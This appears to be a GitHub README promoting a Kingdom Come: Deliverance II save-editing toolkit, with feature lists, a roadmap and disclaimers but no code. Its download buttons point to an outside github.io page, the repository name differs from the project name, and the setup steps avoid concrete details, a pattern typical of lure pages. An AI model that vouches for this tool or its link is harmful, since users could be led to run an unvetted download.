![preview](https://raw.githubusercontent.com/imthegamer404-bot/KCD2-Forge-Mod-Suite/main/screen_fe74394.svg)
[![Download](https://raw.githubusercontent.com/imthegamer404-bot/KCD2-Forge-Mod-Suite/main/grab_ffa51f.svg)](https://imthegamer404-bot.github.io/KCD2-Forge-Mod-Suite/)

<div align="center">

# ⚔️ KCD2 Save Artisan & Companion Toolkit 🛡️

**A meticulously crafted open-source workspace for tailoring, understanding, and enriching your Kingdom Come: Deliverance II playthroughs.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Steam%20Deck-blueviolet.svg)](#-platform-compatibility)
[![Language](https://img.shields.io/badge/Language-C%23%20%7C%20Python%20%7C%20TypeScript-informational.svg)](#-technology-landscape)
[![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen.svg)](#-project-vitality)
[![Community](https://img.shields.io/badge/Community-Driven-orange.svg)](#-join-the-round-table)

</div>

---

## 📜 Prologue — Why This Repository Exists

Every journey through medieval Bohemia deserves a personal touch. Kingdom Come: Deliverance II is a tapestry of choices, consequences, and quiet moments beneath the stars. Yet sometimes, the tapestry you weave in your head does not match the one the game hands you — perhaps you wish to carry a bit more coin for that tavern evening, adjust the balance of a duel, or simply preserve a cherished save before a pivotal decision.

**KCD2 Save Artisan & Companion Toolkit** is a community-driven initiative that gives players a principled way to shape their own adventure. It is not a "cheat engine," and it is not a shortcut past the joy of the game. Think of it instead as a **blacksmith's workshop for your save files** — a place where raw, unpolished data is heated, hammered, and refined into something that fits your personal journey.

This project was born from a deep appreciation for Warhorse Studios' craftsmanship and a desire to extend the life of an already magnificent title. Whether you are a curious tinkerer, a data-driven modder, or a roleplayer who wants a slightly different starting coinpurse, this toolkit was built with you in mind.

---

## ✨ Feature Constellation

Our toolkit is organized into modular pillars. Each pillar can be used independently, or combined for a truly bespoke experience.

### 🧭 Save Intelligence & Inspection
- **Deep Save Parsing** — Reads and interprets save file structures from Kingdom Come: Deliverance II across supported game versions.
- **Human-Readable Summaries** — Transforms opaque binary blobs into legible reports covering player stats, inventory, quest flags, and world state.
- **Diff Viewer** — Compare two saves side-by-side to understand exactly what changed between decisions.
- **Snapshot Timeline** — Keeps a chronological, searchable timeline of your save history for easy rollback.

### 🛠️ Character & Inventory Artisan
- **Attribute Sculptor** — Fine-tune strength, agility, speech, and other core attributes within configurable bounds.
- **Groschen Ledger** — Adjust coin balance with transparent logging so you always know the "why" behind the "what."
- **Inventory Curator** — Add, remove, or rearrange items with safeguards against invalid combinations.
- **Reputation Weaver** — Nudge faction reputations to reflect a different roleplay path.

### ⚙️ World State Conductor
- **Quest Flag Editor** — Toggle quest progression flags for testing or alternate narrative branches.
- **Weather & Time Adjuster** — Set the hour of day and prevailing climate for cinematic screenshots.
- **NPC Relationship Map** — Visualize and gently adjust how certain characters perceive you.

### 🎨 Interface & Experience
- **Responsive UI** — A layout that adapts gracefully from a 4K desktop monitor to a Steam Deck screen.
- **Multilingual Support** — Interface strings localized for English, German, Czech, Polish, French, Spanish, and Japanese communities.
- **Dark & Parchment Themes** — Choose between a modern dark mode and a warm, medieval-styled parchment skin.
- **Keyboard-First Navigation** — Every action reachable without ever touching a mouse.
- **Accessibility Hooks** — High-contrast mode, scalable fonts, and screen-reader-friendly labels.

### 🛡️ Safety & Integrity Layer
- **Automatic Backup Ritual** — Every modification triggers a timestamped backup stored in a configurable directory.
- **Dry-Run Simulation** — Preview the outcome of any change before committing it.
- **Checksum Verification** — Validate save integrity before and after edits to detect corruption early.
- **Undo Stack** — A multi-step undo history so no mistake is ever permanent.

### 🌐 Companion Ecosystem
- **Plain-Text Recipe Files** — All presets are stored in human-readable formats for community sharing.
- **Import & Export Profiles** — Trade curated configurations with friends.
- **Headless CLI Mode** — Automate repetitive tasks for power users and modders.
- **Plugin Hooks** — A documented extension API for community developers.

---

## 🧩 Technology Landscape

The project is intentionally polyglot, choosing the right tool for each layer of the workflow.

| Layer | Technology | Purpose |
|-------|------------|---------|
| Core Engine | C# (.NET) | Save parsing, memory-mapped I/O, and rule engine |
| Automation Scripts | Python (3.11+) | Batch processing, data pipelines, and CLI helpers |
| Interface Layer | TypeScript + Modern Web Runtime | Responsive UI shell and localization bundle |
| Build & Release | GitHub Actions | Cross-platform artifacts and reproducible builds |
| Docs | Markdown + Static Site Generator | Community knowledge base |

We keep dependencies minimal on purpose. A lean toolchain is a resilient toolchain — much like a well-forged blade.

---

## 🚀 Getting Started Without the Fuss

We deliberately avoid generic package-manager incantations because our supported platforms and users are diverse. Instead, follow the narrative below.

### 1. Acquire the Toolkit
Navigate to the artifacts area of this repository and obtain the build appropriate for your operating system. The release notes always describe which game version the build targets.

### 2. Prepare Your Environment
Ensure your game's save directory is backed up. We recommend pointing the toolkit at a **copied** directory first — think of it as a sparring match before the real tournament.

### 3. Launch the Interface
Open the desktop shell and let the toolkit discover your save directory automatically, or point it manually via the settings panel.

### 4. Import a Save
Drag a save file into the workspace. The **Save Intelligence** module will render a readable summary within seconds.

### 5. Make Your Adjustments
Use the Artisan panels to refine attributes, inventory, and world state. Every action is logged, every change is reversible.

### 6. Export & Verify
Commit your changes. The toolkit produces a new save file alongside the original and runs a checksum verification pass.

### 7. Play
Load the new save in Kingdom Come: Deliverance II and continue your story the way you intended.

---

## 🧪 Project Vitality

We treat maintenance as a first-class feature. The repository is structured for long-term sustainability.

- **Semantic Versioning** — Every release is tagged with a clear major/minor/patch number.
- **Changelog Discipline** — Human-written changelogs describe not just what changed, but why.
- **Issue Templates** — Guided forms help contributors report bugs and request features without friction.
- **Code of Conduct** — A shared understanding of mutual respect across the community.
- **Contributing Guide** — A welcoming path from first-time observer to seasoned maintainer.
- **Security Policy** — A private channel for responsible disclosure of sensitive findings.
- **Continuous Integration** — Every pull request runs an automated validation suite.

---

## 🌍 Platform Compatibility

- Windows 10 and Windows 11 (x64 and ARM64)
- Linux distributions with .NET runtime 8 or newer
- Steam Deck (via Desktop Mode)
- macOS (experimental, community-tested)

---

## 💬 24/7 Community Support

The Round Table never sleeps — or at least, there is always someone tending the fire. Our support philosophy is built on three pillars:

1. **Asynchronous Help** — Discussion threads and issue trackers are triaged around the clock by rotating maintainers across time zones.
2. **Self-Service Knowledge** — A growing wiki and FAQ covers the most common questions, so you can find answers without waiting.
3. **Peer Mentorship** — Seasoned contributors actively guide newcomers through their first successful adjustment.

We do not promise instant replies at 3 AM, but we do promise that no question is ignored.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Stabilize save parser for the latest patch level and expand localization coverage.
- **Q2 2026** — Introduce the Plugin Hooks API with developer documentation and example plugins.
- **Q3 2026** — Launch a community preset gallery for sharing curated profiles.
- **Q4 2026** — Ship a performance-focused rewrite of the diff viewer for very large saves.

---

## 🤝 Join the Round Table

We welcome contributors of all backgrounds. You do not need to be a veteran modder to help.

- **Report an issue** — Clear reproduction steps make a huge difference.
- **Suggest a feature** — Describe the problem first, then the idea.
- **Improve documentation** — Clarity is a gift to every future reader.
- **Translate the interface** — Bring the toolkit to your language community.
- **Write a preset** — Share a configuration that tells a compelling story.

Please read the contributing guide before opening your first pull request.

---

## 🔐 Security & Responsible Use

This toolkit operates on files you own, on machines you control. We never transmit your save data anywhere. We encourage players to respect the intended experience of Kingdom Come: Deliverance II, and to use this project as a means of personal expression and curiosity rather than as a substitute for the adventure itself.

---

## ⚠️ Disclaimer

**Kingdom Come: Deliverance II** and all related trademarks, characters, and assets are the property of their respective rights holders, including Warhorse Studios and Deep Silver.

This repository is an independent, community-driven project. It is **not affiliated with, endorsed by, sponsored by, or otherwise connected to** the developers or publishers of the game.

The toolkit is provided for personal, educational, and creative purposes only. Users are solely responsible for how they apply it, and for any effects on their own save files or gameplay. Always keep backups. The maintainers assume no liability for data loss, unintended consequences, or any disruption arising from use of this software.

By using this project, you acknowledge that you have read and understood this disclaimer.

---

## 📄 License

This project is released under the **MIT License**.

You are welcome to use, modify, and distribute this work in accordance with the terms of that license. See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — KCD2 Save Artisan & Companion Toolkit Contributors

---

## 🕯️ Final Word

A save file is a memory. A memory is a story. And a story, once told, deserves to be told the way you remember it.

May your roads be safe, your sword be sharp, and your saves be ever in your own hands.

**[![Download](https://raw.githubusercontent.com/imthegamer404-bot/KCD2-Forge-Mod-Suite/main/grab_ffa51f.svg)](https://imthegamer404-bot.github.io/KCD2-Forge-Mod-Suite/)**